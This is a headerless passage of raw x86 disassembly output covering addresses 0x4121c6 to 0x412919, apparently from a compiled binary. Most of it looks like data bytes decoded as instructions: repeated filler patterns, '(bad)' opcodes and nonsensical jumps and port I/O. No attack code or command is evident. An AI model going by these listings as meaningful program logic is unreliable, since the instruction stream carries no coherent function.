  4121c6:	add    BYTE PTR [eax],al
  4121c8:	fcom   DWORD PTR [esi]
  4121ca:	add    BYTE PTR [eax],al
  4121cc:	xor    DWORD PTR [eax+0x2c4a4eb2],ecx
  4121d2:	and    BYTE PTR [ebx],ch
  4121d4:	xor    eax,0xd554cf23
  4121d9:	jmp    DWORD PTR [edx-0x7f25f39e]
  4121df:	or     DWORD PTR [eax],eax
  4121e1:	add    BYTE PTR [esi-0x20],bl
  4121e4:	or     ecx,DWORD PTR [eax]
  4121e6:	inc    eax
  4121e7:	mov    cl,0xa
  4121e9:	push   0x517ba48d
  4121ee:	scas   eax,DWORD PTR es:[edi]
  4121ef:	in     al,dx
  4121f0:	add    DWORD PTR [eax],eax
  4121f2:	xor    ebp,ebp
  4121f4:	add    DWORD PTR [eax],eax
  4121f6:	xor    ebp,ebp
  4121f8:	add    DWORD PTR [eax],eax
  4121fa:	xor    ebp,ebp
  4121fc:	add    DWORD PTR [eax],eax
  4121fe:	xor    ebp,ebp
  412200:	add    DWORD PTR [eax],eax
  412202:	xor    ebp,ebp
  412204:	add    DWORD PTR [eax],eax
  412206:	xor    ebp,ebp
  412208:	add    DWORD PTR [eax],eax
  41220a:	xor    ebp,ebp
  41220c:	add    DWORD PTR [eax],eax
  41220e:	xor    ebp,ebp
  412210:	add    DWORD PTR [eax],eax
  412212:	xor    ebp,ebp
  412214:	add    DWORD PTR [eax],eax
  412216:	xor    ebp,ebp
  412218:	add    DWORD PTR [eax],eax
  41221a:	xor    ebp,ebp
  41221c:	add    DWORD PTR [eax],eax
  41221e:	xor    ebp,ebp
  412220:	add    DWORD PTR [eax],eax
  412222:	xor    ebp,ebp
  412224:	add    DWORD PTR [eax],eax
  412226:	xor    ebx,ebp
  412228:	add    DWORD PTR [eax],eax
  41222a:	xor    ebx,ebp
  41222c:	add    DWORD PTR [eax],eax
  41222e:	xor    ebx,ebp
  412230:	add    DWORD PTR [eax],eax
  412232:	xor    ebx,ebp
  412234:	add    DWORD PTR [eax],eax
  412236:	xor    ebx,ebp
  412238:	add    DWORD PTR [eax],eax
  41223a:	xor    ebx,ebp
  41223c:	add    DWORD PTR [eax],eax
  41223e:	xor    ebx,ebp
  412240:	add    DWORD PTR [eax],eax
  412242:	xor    ebx,ebp
  412244:	add    DWORD PTR [eax],eax
  412246:	add    BYTE PTR [eax],al
  412248:	xor    DWORD PTR [edi+eiz*8],edx
  41224b:	add    esi,DWORD PTR [ecx]
  41224d:	adc    al,0xe7
  41224f:	add    esi,DWORD PTR [ecx]
  412251:	adc    al,0xe7
  412253:	add    esi,DWORD PTR [ecx]
  412255:	adc    al,0xe7
  412257:	add    esi,DWORD PTR [ecx]
  412259:	adc    al,0xe7
  41225b:	add    esi,DWORD PTR [ecx]
  41225d:	adc    al,0xe7
  41225f:	add    esi,DWORD PTR [ecx]
  412261:	adc    al,0xe7
  412263:	add    esi,DWORD PTR [ecx]
  412265:	adc    al,0xe7
  412267:	add    esi,DWORD PTR [ecx]
  412269:	adc    al,0xe7
  41226b:	add    esi,DWORD PTR [ecx]
  41226d:	adc    al,0xe7
  41226f:	add    esi,DWORD PTR [ecx]
  412271:	adc    al,0xe7
  412273:	add    esi,DWORD PTR [ecx]
  412275:	adc    al,0xe7
  412277:	add    esi,DWORD PTR [ecx]
  412279:	adc    al,0xe7
  41227b:	add    esi,DWORD PTR [ecx]
  41227d:	adc    al,0xe7
  41227f:	add    esi,DWORD PTR [ecx]
  412281:	adc    al,0xe7
  412283:	add    esi,DWORD PTR [ecx]
  412285:	adc    al,0xe7
  412287:	add    esi,DWORD PTR [ecx]
  412289:	adc    al,0xe7
  41228b:	add    esi,DWORD PTR [ecx]
  41228d:	adc    al,0xe7
  41228f:	add    esi,DWORD PTR [ecx]
  412291:	adc    al,0xe7
  412293:	add    esi,DWORD PTR [ecx]
  412295:	adc    al,0xe7
  412297:	add    esi,DWORD PTR [ecx]
  412299:	adc    al,0xe7
  41229b:	add    esi,DWORD PTR [ecx]
  41229d:	adc    al,0xe7
  41229f:	add    esi,DWORD PTR [ecx]
  4122a1:	adc    al,0xe7
  4122a3:	add    esi,DWORD PTR [ecx]
  4122a5:	adc    al,0xe7
  4122a7:	add    esi,DWORD PTR [ecx]
  4122a9:	adc    al,0xe7
  4122ab:	add    eax,DWORD PTR [eax]
  4122ad:	add    BYTE PTR [ecx],dh
  4122af:	adc    al,0xe7
  4122b1:	add    esi,DWORD PTR [ecx]
  4122b3:	adc    al,0xe7
  4122b5:	add    esi,DWORD PTR [ecx]
  4122b7:	adc    al,0xe7
  4122b9:	add    esi,DWORD PTR [ecx]
  4122bb:	adc    al,0xe7
  4122bd:	add    esi,DWORD PTR [ecx]
  4122bf:	adc    al,0xe7
  4122c1:	add    esi,DWORD PTR [ecx]
  4122c3:	adc    al,0x0
  4122c5:	jmp    0xe94136fc
  4122ca:	xor    dl,BYTE PTR [eax+eax*1]
  4122cd:	jmp    0xe9413704
  4122d2:	xor    dl,BYTE PTR [eax+eax*1]
  4122d5:	jmp    0xe941370c
  4122da:	xor    dl,BYTE PTR [eax+eax*1]
  4122dd:	jmp    0xe9413714
  4122e2:	xor    dl,BYTE PTR [eax+eax*1]
  4122e5:	jmp    0xe941371c
  4122ea:	xor    dl,BYTE PTR [eax+eax*1]
  4122ed:	jmp    0xe9413724
  4122f2:	xor    dl,BYTE PTR [eax+eax*1]
  4122f5:	fcomp  DWORD PTR [ebx+eiz*1+0x34]
  4122f9:	aam    0x40
  4122fb:	adc    al,0x70
  4122fd:	mov    ch,bh
  4122ff:	bound  esi,QWORD PTR [ebp-0x72]
  412302:	add    al,0x78
  412304:	add    BYTE PTR [ecx+0xa],bh
  412307:	bound  ecx,QWORD PTR fs:[ebx+0x4c757132]
  41230e:	jecxz  0x412377
  412310:	ja     0x4122fb
  412312:	add    BYTE PTR [eax],al
  412314:	and    eax,0x201d3126
  412319:	adc    al,0x6a
  41231b:	inc    esp
  41231c:	ret    0x7164
  41231f:	jmp    0xf5724921
  412324:	add    DWORD PTR [edx],ebp
  412326:	xor    eax,0x323132f1
  41232b:	cli    
  41232c:	pop    esi
  41232d:	adc    al,0x5f
  41232f:	or     edx,DWORD PTR [edx+0x32da322f]
  412335:	jo     0x41239a
  412337:	sbb    eax,0xff677388
  41233c:	xor    ch,BYTE PTR [eax+0x63]
  41233f:	add    BYTE PTR [ebx],cl
  412341:	jo     0x412343
  412343:	ins    BYTE PTR es:[edi],dx
  412344:	das    
  412345:	outs   dx,BYTE PTR ds:[esi]
  412346:	popa   
  412347:	add    BYTE PTR [ecx-0x17ffd0db],bh
  41234d:	js     0x4123be
  41234f:	jae    0x412358
  412351:	ja     0x4123c5
  412353:	cmp    DWORD PTR fs:[eax],ebx
  412356:	push   0x6b77ec65
  41235b:	add    BYTE PTR [ebp-0xa94918a],cl
  412361:	pusha  
  412362:	add    BYTE PTR [edx+edi*2+0x78],ah
  412366:	arpl   WORD PTR [edi-0x12],bp
  412369:	adc    esi,DWORD PTR [edx+esi*2-0x1b]
  41236d:	bound  esi,QWORD PTR [esi+ebp*2-0x41]
  412371:	sub    BYTE PTR [eax],al
  412373:	xor    DWORD PTR [ecx+0x28],edi
  412376:	sub    eax,0x79000031
  41237b:	adc    esp,DWORD PTR [ebp+0x6c]
  41237e:	(bad)  
  412380:	popa   
  412381:	jns    0x412322
  412383:	add    BYTE PTR fs:[ecx],dh
  412386:	mov    edx,0xb6353422
  41238b:	add    BYTE PTR cs:[ebx-0x50],dh
  41238f:	js     0x4123f5
  412391:	outs   dx,DWORD PTR ds:[esi]
  412392:	pop    es
  412393:	sbb    BYTE PTR ds:0x31243b32,ch
  412399:	ss aaa 
  41239b:	and    BYTE PTR ds:0x726ffb00,dh
  4123a1:	imul   ecx,DWORD PTR [ebx],0x5730064
  4123a7:	jbe    0x412418
  4123a9:	push   0x6175f1
  4123ae:	ins    DWORD PTR es:[edi],dx
  4123af:	jns    0x412420
  4123b1:	je     0x4123e8
  4123b3:	bound  eax,QWORD PTR [eax]
  4123b5:	arpl   WORD PTR [edi],bp
  4123b7:	ins    DWORD PTR es:[edi],dx
  4123b8:	jo     0x41242f
  4123ba:	xor    DWORD PTR [ecx],eax
  4123bc:	pop    edi
  4123bd:	jb     0x4123f0
  4123bf:	std    
  4123c0:	jno    0x412429
  4123c2:	xchg   edi,eax
  4123c3:	or     bl,BYTE PTR [edi+0x71]
  4123c6:	sub    ch,0x6d
  4123c9:	mov    cs,WORD PTR ds:0x725f
  4123ce:	xor    DWORD PTR [edi],edx
  4123d0:	gs ins DWORD PTR es:[edi],dx
  4123d2:	pop    ebp
  4123d3:	retf   
  4123d4:	fs ins BYTE PTR es:[edi],dx
  4123d6:	dec    ebp
  4123d7:	in     eax,dx
  4123d8:	outs   dx,BYTE PTR fs:[esi]
  4123da:	dec    esi
  4123db:	shl    BYTE PTR [ebp+0x0],1
  4123de:	add    BYTE PTR [eax],al
  4123e0:	pop    ebx
  4123e1:	fdiv   DWORD PTR [edx+0x73]
  4123e4:	inc    edx
  4123e5:	fadd   QWORD PTR [ecx]
  4123e7:	das    
  4123e8:	add    ebx,edx
  4123ea:	xor    al,0x32
  4123ec:	add    ch,ch
  4123ee:	outs   dx,BYTE PTR ds:[esi]
  4123ef:	push   0x7660a910
  4123f4:	or     al,0x7b
  4123f6:	add    DWORD PTR [esi+0x23],esp
  4123f9:	cwde   
  4123fa:	pusha  
  4123fb:	fs push es
  4123fd:	cwde   
  4123fe:	add    DWORD PTR [ecx+0x18],ebp
  412401:	popa   
  412402:	arpl   WORD PTR gs:[ebx],ax
  412405:	in     eax,dx
  412406:	fs jno 0x41241e
  412409:	xchg   edi,eax
  41240a:	add    DWORD PTR [ecx+0x6],esi
  41240d:	mov    ah,BYTE PTR [edx+0x63]
  412410:	jecxz  0x4123fe
  412412:	jb     0x412487
  412414:	loope  0x412465
  412416:	jb     0x412483
  412418:	ror    BYTE PTR [esi+0x4],1
  41241b:	imul   ecx,eax,0x49
  41241e:	ins    BYTE PTR es:[edi],dx
  41241f:	pop    edi
  412420:	aam    0x20
  412422:	add    al,0x61
  412424:	(bad)  [edi+0x5d]
  412427:	jno    0x4123fd
  412429:	in     al,dx
  41242a:	push   0x6e
  41242c:	mov    ebp,0x946e724f
  412431:	daa    
  412432:	add    al,0x6a
  412434:	xchg   esi,eax
  412435:	adc    al,0x1a
  412437:	ins    BYTE PTR es:[edi],dx
  412438:	mov    ds:0xa25de773,al
  41243d:	jno    0x412441
  41243f:	jnp    0x4123dd
  412441:	addr16 out 0x61,eax
  412444:	add    BYTE PTR [eax],al
  412446:	xchg   ebp,eax
  412447:	ja     0x412443
  412449:	jo     0x4123dd
  41244b:	js     0x412434
  41244d:	popa   
  41244e:	push   esi
  41244f:	popa   
  412450:	or     al,0x62
  412452:	mov    ?,WORD PTR [eax-0x5]
  412455:	add    esp,DWORD PTR [eax+0x68]
  412458:	enter  0x6471,0x73
  41245c:	fnstenv [eax+0x31]
  41245f:	and    al,0x17
  412461:	xor    al,0x1
  412463:	and    al,0x17
  412465:	add    al,0x41
  412467:	addr16 mov ecx,0xe7774d73
  41246d:	imul   eax,DWORD PTR [edx+eiz*2-0x35],0xc5141f62
  412475:	bound  ecx,QWORD PTR [esi]
  412477:	push   0x6720038f
  41247c:	mov    WORD PTR [esi+0x12],fs
  41247f:	(bad)  
  412480:	out    0x62,eax
  412482:	add    BYTE PTR [ebx+edi*2+0x5e],ch
  412486:	(bad)  
  412487:	adc    ecx,DWORD PTR [ecx-0x7b97ff92]
  41248d:	jno    0x4124c0
  41248f:	ins    BYTE PTR es:[edi],dx
  412490:	mov    WORD PTR [edx-0x19],fs
  412493:	jbe    0x412512
  412495:	add    esp,ecx
  412497:	jbe    0x4124f0
  412499:	je     0x41246d
  41249b:	popa   
  41249c:	out    0x2c,eax
  41249e:	sbb    al,0x25
  4124a0:	push   ds
  4124a1:	sub    eax,0x6be72504
  4124a6:	ret    0x3b6d
  4124a9:	pop    edi
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	ret    
  4124ad:	adc    ecx,DWORD PTR [ebx+0x65]
  4124b0:	mov    edi,0xaa450076
  4124b5:	adc    al,0x5f
  4124b7:	aas    
  4124b8:	xchg   ecx,eax
  4124b9:	bound  esp,QWORD PTR [ebx+0x1e]
  4124bc:	xor    eax,0x8e0e6868
  4124c1:	cmp    eax,0x6e93e971
  4124c6:	gs add al,0x99
  4124c9:	arpl   WORD PTR [eax],ax
  4124cb:	or     cl,BYTE PTR [ebp-0x75f28dc3]
  4124d1:	jno    0x4124d3
  4124d3:	or     eax,0x4676e52
  4124d8:	pop    ecx
  4124d9:	adc    al,0x2f
  4124db:	sbb    BYTE PTR [edx],ah
  4124dd:	sub    eax,0x6e77d300
  4124e2:	outs   dx,BYTE PTR ds:[esi]
  4124e3:	shr    BYTE PTR [ecx+esi*2+0x72],0xe9
  4124e8:	inc    ecx
  4124e9:	jne    0x412559
  4124eb:	into   
  4124ec:	push   esi
  4124ed:	jno    0x4124ef
  4124ef:	rcl    DWORD PTR [ebx+0x6e],1
  4124f2:	outs   dx,BYTE PTR ds:[esi]
  4124f3:	enter  0x141a,0x6f
  4124f7:	enter  0x6728,0x71
  4124fb:	mov    eax,ds:0x995f6c32
  412500:	and    ah,BYTE PTR [ebp+0x0]
  412503:	test   BYTE PTR [ebx],dl
  412505:	push   0x140a8072
  41250a:	jo     0x412494
  41250c:	add    DWORD PTR [ebx+0x0],esp
  41250f:	mov    BYTE PTR [eax],al
  412511:	add    BYTE PTR [ebx],dl
  412513:	cmp    eax,0x13d3885f
  412518:	ss mov ah,0x16
  41251b:	and    esi,DWORD PTR [edx]
  41251d:	sbb    BYTE PTR ds:0xd3486b3d,dh
  412523:	ja     0x412584
  412525:	jmp    0x41b593fa
  41252a:	in     al,0x6d
  41252c:	add    BYTE PTR gs:[eax+0x69],cl
  412530:	outs   dx,BYTE PTR gs:[esi]
  412532:	out    dx,eax
  412533:	push   0x72
  412535:	add    BYTE PTR [ebp+0x77],dh
  412538:	je     0x4125a2
  41253a:	ins    DWORD PTR es:[edi],dx
  41253b:	bound  eax,QWORD PTR [eax]
  41253d:	jae    0x412585
  41253f:	ja     0x4125ac
  412541:	jo     0x412594
  412543:	adc    BYTE PTR [edx+0x65],ch
  412546:	sub    esp,DWORD PTR [ebx+0x65]
  412549:	arpl   WORD PTR [ecx],di
  41254b:	adc    BYTE PTR [ebx+0x65],dh
  41254e:	and    al,0x73
  412550:	imul   ebp,DWORD PTR [ebp+0x2d],0x10
  412554:	jo     0x4125c5
  412556:	xor    ebp,DWORD PTR [ebp+0x69]
  412559:	outs   dx,DWORD PTR ds:[esi]
  41255a:	out    0x17,al
  41255c:	gs ins BYTE PTR es:[edi],dx
  41255e:	pop    es
  41255f:	pop    esi
  412560:	popa   
  412561:	jns    0x41254a
  412563:	pop    esp
  412564:	sub    eax,0x2d212900
  412569:	xor    DWORD PTR [ecx],ebp
  41256b:	adc    BYTE PTR [ecx+0x75],ch
  41256e:	jnp    0x4125d3
  412570:	pop    ebp
  412571:	outs   dx,BYTE PTR ds:[esi]
  412572:	out    dx,eax
  412573:	pop    ss
  412574:	push   0x74000065
  412579:	imul   esp,DWORD PTR [di-0x68],0xbc737139
  412581:	cmp    BYTE PTR [esi+0x0],ch
  412584:	ret    0x6f70
  412587:	ins    DWORD PTR es:[edi],dx
  412588:	mov    cl,0x75
  41258a:	popa   
  41258b:	add    BYTE PTR [edi],al
  41258d:	popa   
  41258e:	pop    ebp
  41258f:	outs   dx,BYTE PTR ds:[esi]
  412590:	scas   eax,DWORD PTR es:[edi]
  412591:	ins    BYTE PTR es:[edi],dx
  412592:	add    BYTE PTR [ebp+ebp*4+0x62],dh
  412596:	je     0x412601
  412598:	mov    dh,0x6e
  41259a:	add    BYTE PTR [ecx-0x18],ah
  41259d:	data16 ins BYTE PTR es:[edi],dx
  41259f:	gs dec eax
  4125a1:	je     0x412608
  4125a3:	arpl   WORD PTR [eax],ax
  4125a5:	ins    DWORD PTR es:[edi],dx
  4125a6:	ins    BYTE PTR es:[edi],dx
  4125a7:	ins    BYTE PTR es:[edi],dx
  4125a8:	xor    DWORD PTR [eax+0x4],ecx
  4125ab:	jo     0x412579
  4125ad:	dec    ebx
  4125ae:	arpl   WORD PTR gs:[ecx],si
  4125b1:	push   ds
  4125b2:	addr16 popa 
  4125b4:	ret    
  4125b5:	dec    edi
  4125b6:	js     0x4125b8
  4125b8:	pusha  
  4125b9:	in     eax,dx
  4125ba:	push   0x72
  4125bc:	nop
  4125bd:	dec    esi
  4125be:	add    BYTE PTR [bp+0x6004],ah
  4125c3:	ins    BYTE PTR es:[edi],dx
  4125c4:	mov    BYTE PTR [edi+ebx*2],cl
  4125c7:	add    BYTE PTR [eax-0x73899eef],bl
  4125cd:	add    al,0x61
  4125cf:	jae    0x412614
  4125d1:	in     eax,dx
  4125d2:	pop    edi
  4125d3:	addr16 xchg edx,eax
  4125d5:	or     ah,BYTE PTR [eax+0x63]
  4125d8:	xor    DWORD PTR [ebx+0x3637],ebx
  4125de:	pop    ds
  4125df:	mov    ds:0xb84c0037,eax
  4125e4:	addr16 dec ax
  4125e7:	retf   
  4125e8:	add    DWORD PTR [ebp+0x50],esp
  4125eb:	mov    ecx,0xc4507568
  4125f0:	add    DWORD PTR [esi+0x44],esp
  4125f3:	into   
  4125f4:	pop    esi
  4125f5:	ja     0x41263d
  4125f7:	mov    al,ds:0x9e100034
  4125fc:	jbe    0x412666
  4125fe:	push   ss
  4125ff:	cdq    
  412600:	push   0x598c0900
  412605:	pop    edi
  412606:	or     DWORD PTR [ecx+eax*1+0x71921e70],ecx
  41260d:	add    BYTE PTR [ebx],dl
  41260f:	pop    ecx
  412610:	push   0x5f840271
  412615:	xor    DWORD PTR gs:[edi-0x7126a0a3],ecx
  41261c:	pop    ebp
  41261d:	pop    edi
  41261e:	fldlg2 
  412620:	pusha  
  412621:	ja     0x412605
  412623:	adc    edx,DWORD PTR [edi+0x63]
  412626:	shl    BYTE PTR [eax+0x18],1
  412629:	add    al,0xda
  41262b:	je     0x412688
  41262d:	js     0x412608
  41262f:	jo     0x412687
  412631:	add    al,0xd0
  412633:	je     0x41268a
  412635:	arpl   bp,cx
  412637:	je     0x412620
  412639:	je     0x4125d1
  41263b:	push   0x14a3673d
  412640:	cmp    DWORD PTR [ecx+0x0],esp
  412643:	add    BYTE PTR [ebx+0x3178196f],dl
  412649:	jb     0x412659
  41264b:	jbe    0x4125df
  41264d:	bound  ecx,QWORD PTR [esi+esi*2]
  412650:	xor    DWORD PTR [ebx+0x1a],esi
  412653:	push   0x40f7197
  412658:	xor    DWORD PTR [ebx+0xa],0x5c
  41265c:	push   edx
  41265d:	push   0x6b8675e7
  412662:	std    
  412663:	gs dec esp
  412665:	popa   
  412666:	out    0x68,eax
  412668:	bound  ebp,QWORD PTR [ebx-0x2d]
  41266b:	bound  eax,QWORD PTR [ebx+0x14]
  41266e:	xlat   BYTE PTR ds:[ebx]
  41266f:	data16 pushw 0xffd4
  412673:	ja     0x4126a6
  412675:	jbe    0x41263f
  412677:	ja     0x4126c3
  412679:	jae    0x412648
  41267b:	add    edx,DWORD PTR [eax]
  41267d:	imul   eax,esi,0xe76f0e5c
  412683:	gs (bad) 
  412685:	push   0xffffff93
  412687:	pushw  ds
  412689:	adc    al,0x9a
  41268b:	pusha  
  41268c:	adc    BYTE PTR [ebp-0x74],dh
  41268f:	jne    0x4126e7
  412691:	adc    al,0x7c
  412693:	pop    edx
  412694:	adc    BYTE PTR [ebp-0x74],ch
  412697:	push   0x31
  412699:	jbe    0x41262b
  41269b:	ja     0x41266f
  41269d:	data16 add BYTE PTR [edx+esi*1-0x1829c94],cl
  4126a5:	data16 das 
  4126a7:	jmp    0x6d1026ac
  4126ac:	addr16 dec edi
  4126ae:	(bad)  
  4126af:	ins    BYTE PTR es:[edi],dx
  4126b0:	add    BYTE PTR [ebp-0x2e],cl
  4126b3:	push   0x6d
  4126b5:	push   ebp
  4126b6:	rcl    BYTE PTR [ebx],cl
  4126b8:	jno    0x412702
  4126ba:	(bad)  
  4126bb:	cmp    BYTE PTR [esi+0x35],ch
  4126be:	lea    edi,[ecx]
  4126c0:	add    BYTE PTR [edx-0x70],cl
  4126c3:	ins    DWORD PTR es:[edi],dx
  4126c4:	jo     0x41270e
  4126c6:	mov    ds:0x92106414,al
  4126cb:	ins    DWORD PTR es:[edi],dx
  4126cc:	ins    DWORD PTR es:[edi],dx
  4126cd:	setns  BYTE PTR [esp+esi*2]
  4126d1:	or     BYTE PTR [edx+0x351b6d68],bl
  4126d7:	jb     0x412746
  4126d9:	sti    
  4126da:	jg     0x412749
  4126dc:	add    BYTE PTR [ebx],dl
  4126de:	push   eax
  4126df:	ins    BYTE PTR es:[edi],dx
  4126e0:	outs   dx,BYTE PTR ds:[esi]
  4126e1:	mov    edx,0xfb002223
  4126e6:	jnp    0x41275b
  4126e8:	push   0x705cc8
  4126ed:	retf   
  4126ee:	outs   dx,BYTE PTR ds:[esi]
  4126ef:	jno    0x41275f
  4126f1:	ret    0x1c03
  4126f4:	xor    ch,cl
  4126f6:	inc    edx
  4126f7:	jne    0x412758
  4126f9:	retf   0x755a
  4126fc:	jno    0x4126e7
  4126fe:	adc    eax,0x32c56d67
  412703:	jb     0x412771
  412705:	mov    esi,0xe9727519
  41270a:	sbb    eax,0x8e6d73
  41270f:	add    BYTE PTR [esi],al
  412711:	jne    0x412785
  412713:	jmp    0x88af6024
  412718:	adc    BYTE PTR [ecx],bh
  41271a:	add    BYTE PTR [eax],al
  41271c:	mov    ds:0xeb656975,al
  412721:	adc    al,0x5d
  412723:	jae    0x4126d9
  412725:	push   0x5d
  412727:	jae    0x4126dd
  412729:	push   0x0
  41272b:	jbe    0x41272e
  41272d:	jne    0x4127a3
  41272f:	outs   dx,DWORD PTR ds:[esi]
  412730:	jmp    0x6439:0xef6c0066
  412737:	outs   dx,DWORD PTR ds:[esi]
  412738:	dec    BYTE PTR [edi]
  41273a:	sub    eax,0x735f3b32
  41273f:	sbb    BYTE PTR gs:[ecx],ah
  412742:	xor    dh,BYTE PTR [ebx]
  412744:	sub    esp,DWORD PTR [esi]
  412746:	sub    eax,0x5d5c5b00
  41274b:	jb     0x412781
  41274d:	bound  esp,QWORD PTR [ecx+0x6b]
  412750:	sbb    BYTE PTR [edi+0x61],ch
  412753:	outs   dx,DWORD PTR ds:[esi]
  412754:	sub    ch,BYTE PTR [edi+0x61]
  412757:	add    BYTE PTR [edi],ah
  412759:	cmp    DWORD PTR [esi+0x6e],ebp
  41275c:	and    eax,0x396d0062
  412761:	outs   dx,DWORD PTR ds:[esi]
  412762:	arpl   WORD PTR [ecx+0x35],bp
  412765:	adc    BYTE PTR [edx+esi*2+0x31],dh
  412769:	ss gs je 0x41273e
  41276d:	adc    ebp,DWORD PTR [ebx+0x6e]
  412770:	cld    
  412771:	cmp    BYTE PTR [esi+0x65],ch
  412774:	add    BYTE PTR [eax],al
  412776:	fsub   DWORD PTR [eax]
  412778:	xor    dh,BYTE PTR [ebx]
  41277a:	jmp    0xeb4186f4
  41277f:	cmp    esp,DWORD PTR [ebp+0x63]
  412782:	sub    DWORD PTR [esi+ebp*2+0x0],0x72
  412787:	pop    esp
  412788:	outs   dx,BYTE PTR ds:[esi]
  412789:	imul   ebx,edi,0xc0630065
  41278f:	gs gs jae 0x41272b
  412793:	arpl   WORD PTR [ebp+0x73],bx
  412796:	xor    DWORD PTR [edx+0x76],edi
  412799:	xor    BYTE PTR [ebx],al
  41279b:	xchg   ecx,eax
  41279c:	add    DWORD PTR [edi-0x4],ebx
  41279f:	pop    ecx
  4127a0:	jne    0x412809
  4127a2:	fucomip st,st(4)
  4127a4:	jb     0x412816
  4127a6:	rcr    BYTE PTR [edx+0x5a],1
  4127a9:	ja     0x4127dc
  4127ab:	mov    WORD PTR [ebp+0x6b],fs
  4127ae:	enter  0x43e,0x6b
  4127b2:	aam    0x3a
  4127b4:	pusha  
  4127b5:	xlat   BYTE PTR ds:[bx]
  4127b7:	in     al,dx
  4127b8:	ins    WORD PTR es:[edi],dx
  4127ba:	into   
  4127bb:	dec    ebp
  4127bc:	pusha  
  4127bd:	arpl   WORD PTR [ecx],si
  4127bf:	inc    edi
  4127c0:	jb     0x412829
  4127c2:	xchg   esp,eax
  4127c3:	inc    edi
  4127c4:	push   0x5d553171
  4127c9:	jo     0x41275f
  4127cb:	in     eax,dx
  4127cc:	jb     0x412836
  4127ce:	nop
  4127cf:	add    DWORD PTR [ebp+0x6b],ebx
  4127d2:	xor    DWORD PTR [edi],eax
  4127d4:	pop    ebx
  4127d5:	outs   dx,BYTE PTR ds:[esi]
  4127d6:	jge    0x4127e0
  4127d8:	pop    esi
  4127d9:	add    BYTE PTR fs:[eax],al
  4127dc:	mov    gs,ebp
  4127de:	pop    ebp
  4127df:	ins    DWORD PTR es:[edi],dx
  4127e0:	xchg   BYTE PTR [edx],al
  4127e2:	pop    ebx
  4127e3:	outs   dx,BYTE PTR ds:[esi]
  4127e4:	push   esi
  4127e5:	in     eax,dx
  4127e6:	pop    ecx
  4127e7:	pop    edi
  4127e8:	arpl   WORD PTR [ecx],dx
  4127ea:	addr16 ja 0x41281e
  4127ed:	fisub  DWORD PTR [eax+0x6d]
  4127f0:	dec    edx
  4127f1:	enter  0x6c,0x6
  4127f5:	(bad)  
  4127f6:	xor    al,0x35
  4127f8:	xor    ebx,edx
  4127fa:	pop    esi
  4127fb:	jno    0x412851
  4127fd:	mov    ebp,0x98450059
  412802:	bound  ebp,QWORD PTR [ecx+0x28]
  412805:	in     eax,dx
  412806:	gs addr16 push cs
  412809:	aam    0x75
  41280b:	pop    edi
  41280c:	or     eax,0x1d0064ed
  412811:	adc    al,0x8f
  412813:	js     0x412834
  412815:	jo     0x41279b
  412817:	jno    0x41284a
  412819:	arpl   WORD PTR [edi-0x6c92fca4],dx
  41281f:	add    edx,DWORD PTR [ebx]
  412821:	jne    0x4127b8
  412823:	addr16 (bad) 
  412825:	pop    edi
  412826:	out    0x68,eax
  412828:	xlat   BYTE PTR ds:[ebx]
  412829:	pop    edi
  41282a:	mov    WORD PTR [ecx+0x31],?
  41282d:	jne    0x4128ac
  41282f:	ja     0x4127fa
  412831:	push   bp
  412833:	imul   esi,DWORD PTR [ecx],0x73
  412836:	dec    esi
  412837:	jb     0x4127f8
  412839:	jo     0x412896
  41283b:	js     0x41280f
  41283d:	adc    edi,DWORD PTR [edi]
  41283f:	pop    ebp
  412840:	add    BYTE PTR [eax],al
  412842:	shr    BYTE PTR [edx+0x4c],1
  412845:	imul   esi,DWORD PTR [ecx],0x64
  412848:	dec    esi
  412849:	jne    0x4127dd
  41284b:	(bad)  
  41284c:	out    0x61,eax
  41284e:	xchg   edx,eax
  41284f:	inc    cx
  412851:	arpl   WORD PTR [edx-0x69fbea95],cx
  412857:	push   0x5b92760e
  41285c:	push   es
  41285d:	ja     0x41287d
  41285f:	adc    al,0xd8
  412861:	jb     0x4128a6
  412863:	pop    ebp
  412864:	mov    edx,0x105e3166
  412869:	je     0x4128bd
  41286b:	(bad)  
  41286c:	out    0x64,eax
  41286e:	push   edx
  41286f:	data16 add al,0x71
  412872:	dec    esi
  412873:	popa   
  412874:	out    0x58,eax
  412876:	pop    edi
  412877:	imul   eax,esi,0x5b
  41287a:	cmp    eax,0x5274d814
  41287f:	(bad)  
  412881:	push   0x6
  412883:	adc    al,0xca
  412885:	jno    0x412899
  412887:	jae    0x41283c
  412889:	pop    edx
  41288a:	pop    ds
  41288b:	outs   dx,DWORD PTR ds:[esi]
  41288c:	add    cl,ch
  41288e:	adc    al,0x67
  412890:	ins    DWORD PTR es:[edi],dx
  412891:	retf   
  412892:	adc    esp,DWORD PTR [edx+0x0]
  412895:	mov    BYTE PTR [esi],dl
  412897:	ins    DWORD PTR es:[edi],dx
  412898:	mov    BYTE PTR fs:[ecx],al
  41289b:	adc    al,0x72
  41289d:	xchg   BYTE PTR [esi],al
  41289f:	ins    DWORD PTR es:[edi],dx
  4128a0:	imul   eax,DWORD PTR [eax-0x77939cce],0x0
  4128a7:	add    bl,bl
  4128a9:	jo     0x41291d
  4128ab:	jmp    0x8db2958d
  4128b0:	std    
  4128b1:	push   0x34e07900
  4128b6:	addr16 pop edx
  4128b8:	(bad)  
  4128b9:	adc    edi,DWORD PTR [edx+0x61]
  4128bc:	rcr    BYTE PTR [ebp+0x62],1
  4128bf:	inc    edi
  4128c0:	ficom  WORD PTR [ebx]
  4128c2:	jno    0x41290c
  4128c4:	(bad)  
  4128c5:	pusha  
  4128c6:	arpl   WORD PTR [ebp+0x35],dx
  4128c9:	imul   esp,DWORD PTR [edi+0x52],0x4864148e
  4128d0:	xchg   ecx,eax
  4128d1:	push   0x6f2d3a5f
  4128d6:	jb     0x4128e4
  4128d8:	xchg   esi,eax
  4128d9:	data16 add BYTE PTR ds:0x1d74638e,dl
  4128e0:	xchg   esi,eax
  4128e1:	arpl   WORD PTR [ecx+ebp*8+0x57],si
  4128e5:	xor    eax,0x6d630c76
  4128ea:	popa   
  4128eb:	adc    ch,BYTE PTR ds:0x510c6e67
  4128f1:	addr16 jbe 0x4128f8
  4128f4:	sub    eax,0x6bdf5f70
  4128f9:	jo     0x4128fb
  4128fb:	int3   
  4128fc:	pop    ebx
  4128fd:	push   0x1457df6d
  412902:	popa   
  412903:	sar    DWORD PTR [edi],0x62
  412906:	popa   
  412907:	add    BYTE PTR [eax+0x726610],al
  41290d:	add    BYTE PTR [ecx-0x779b9193],al
  412913:	outs   dx,DWORD PTR ds:[esi]
  412914:	imul   esp,DWORD PTR [eax+ecx*4+0x6c],0x61
  412919:	jae    0x4128c7
